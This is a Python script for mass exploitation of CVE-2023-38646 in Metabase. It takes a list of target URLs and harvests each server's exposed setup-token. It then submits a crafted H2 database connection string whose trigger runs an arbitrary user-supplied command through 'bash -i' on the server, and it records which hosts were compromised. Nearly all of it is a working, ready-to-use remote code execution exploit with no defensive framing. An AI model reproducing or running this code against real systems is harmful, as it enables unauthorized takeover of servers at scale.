import argparse
import requests
import urllib3
import base64
from threading import Thread
from urllib.parse import urlparse

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class color:
    blue = "\033[1;34m"
    red = "\033[1;31m"
    green = "\033[1;32m"
    yellow = "\033[1;33m"
    cyan = "\033[1;36m"
    magenta = "\033[1;35m"
    light_green = "\033[1;92m"
    reset = "\033[0m"


def get_token(url):
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "https://" + url

    try:
        response = requests.get(f"{url}/api/session/properties", verify=False)
        if response.status_code == 200:
            data = response.json()
            token = data.get("setup-token")
            if token:
                print(
                    f"[{color.blue}INF{color.reset}] [{color.cyan}{url}{color.reset}] [{color.light_green}token retrieved{color.reset}, token: {color.magenta}{token}{color.reset}, continue...]"
                )
                return token, url
            else:
                print(
                    f"[{color.red}INF{color.reset}] [{url}] [{color.red}token not retrieved{color.reset}, check on your own]"
                )
                print(
                    f"[{color.red}INF{color.reset}] [{url}] [{color.red}Exploit Failed{color.reset}] [X] {color.yellow}skipped{color.reset}...]\n"
                )
                return None, url
        else:
            print(
                f"[{color.red}INF{color.reset}] [{url}] [{color.red}token not retrieved{color.reset}, check on your own]"
            )
            print(
                f"[{color.red}INF{color.reset}] [{url}] [{color.red}Exploit Failed{color.reset}] [X] {color.yellow}skipped{color.reset}...]\n"
            )
            return None, url
    except requests.exceptions.SSLError:
        print(
            f"[{color.red}INF{color.reset}] [{url}] [{color.red}SSL Error{color.reset}, {color.yellow}trying{color.reset} HTTP...]"
        )
        url = url.replace("https://", "http://")
        try:
            response = requests.get(f"{url}/api/session/properties", verify=False)
            if response.status_code == 200:
                data = response.json()
                token = data.get("setup-token")
                if token:
                    print(
                        f"[{color.blue}INF{color.reset}] [{color.cyan}{url}{color.reset}] [{color.light_green}token retrieved{color.reset}, token: {color.magenta}{token}{color.reset}, continue...]"
                    )
                    return token, url
                else:
                    print(
                        f"[{color.red}INF{color.reset}] [{url}] [{color.red}token not retrieved{color.reset}, check on your own]"
                    )
                    print(
                        f"[{color.red}INF{color.reset}] [{url}] [{color.red}Exploit Failed{color.reset}] [X] {color.yellow}skipped{color.reset}...]\n"
                    )
                    return None, url
            else:
                print(
                    f"[{color.red}INF{color.reset}] [{url}] [{color.red}token not retrieved{color.reset}, check on your own]"
                )
                print(
                    f"[{color.red}INF{color.reset}] [{url}] [{color.red}Exploit Failed{color.reset}] [X] {color.yellow}skipped{color.reset}...]\n"
                )
                return None, url
        except:
            print(
                f"[{color.red}INF{color.reset}] [{url}] [{color.red}Error connecting{color.reset}, check on your own]"
            )
            print(
                f"[{color.red}INF{color.reset}] [{url}] [{color.red}Exploit Failed{color.reset}] [X] {color.yellow}skipped{color.reset}...]\n"
            )
            return None, url


def exploit_bug(url, token, encoded_command):
    if token:
        payload = {
            "token": token,
            "details": {
                "is_on_demand": False,
                "is_full_sync": False,
                "is_sample": False,
                "cache_ttl": None,
                "refingerprint": False,
                "auto_run_queries": True,
                "schedules": {},
                "details": {
                    "db": f"zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {{echo,{encoded_command}}}|{{base64,-d}}|{{bash,-i}}')\n$$--=x",
                    "advanced-options": False,
                    "ssl": True,
                },
                "name": "an-sec-research-team",
                "engine": "h2",
            },
        }

        response = requests.post(
            f"{url}/api/setup/validate", json=payload, verify=False
        )
        if "Error creating or initializing trigger" in response.text:
            print(
                f"[{color.blue}INF{color.reset}] [{color.cyan}{url}{color.reset}] [{color.light_green}Exploit Success{color.reset}] [âœ“]\n"
            )
            return "Exploit Success"
        else:
            # print(f"[INF] [{url}] [Exploit Failed] [X] skipped... ")
            return "Exploit Failed"
    else:
        # print(f"[INF] [{url}] [Exploit Failed] [X] skipped... ")
        return "Exploit Failed"


def exploit_target(url, command, output_file):
    token, url = get_token(url)
    encoded_command = (
        base64.b64encode(command.encode("utf-8")).decode("utf-8").rstrip("=")
    )
    result = exploit_bug(url, token, encoded_command)

    if result == "Exploit Success" and output_file:
        with open(output_file, "a") as file:
            file.write(url + "/\n")

    return result


def main():
    parser = argparse.ArgumentParser(
        description="Massively exploit CVE-2023-38646 vulnerability in Metabase"
    )
    parser.add_argument(
        "-f",
        "--file",
        required=True,
        help="Path to the file containing list of targets",
    )
    parser.add_argument(
        "-t",
        "--threads",
        default=5,
        type=int,
        help="Number of threads for exploitation",
    )
    parser.add_argument(
        "-c", "--command", required=True, help="Custom command to be executed"
    )
    parser.add_argument(
        "-o",
        "--output",
        help="Path to the output file to store vulnerable targets",
    )

    args = parser.parse_args()

    targets = []
    with open(args.file, "r") as file:
        targets = [line.strip() for line in file.readlines()]

    global threads
    threads = args.threads

    print(f"[-] Custom command: {args.command}")
    print(
        f"[-] Encoded Command : {base64.b64encode(args.command.encode('utf-8')).decode('utf-8').rstrip('=')}"
    )
    print(f"[-] Target in List: {len(targets)}")
    print(f"[-] Threads: {threads}\n")
    print("[!] EXPLOIT START....\n")

    results = []
    for target in targets:
        t = Thread(
            target=lambda res=results, tar=target: res.append(
                exploit_target(tar, args.command, args.output)  # Tambahkan args.output
            )
        )
        t.start()
        t.join()

    print("\n[!] STOPPED")
    print(f"[*] Total Success : {results.count('Exploit Success')}")
    print(f"[*] Failed : {results.count('Exploit Failed')}")


if __name__ == "__main__":
    main()
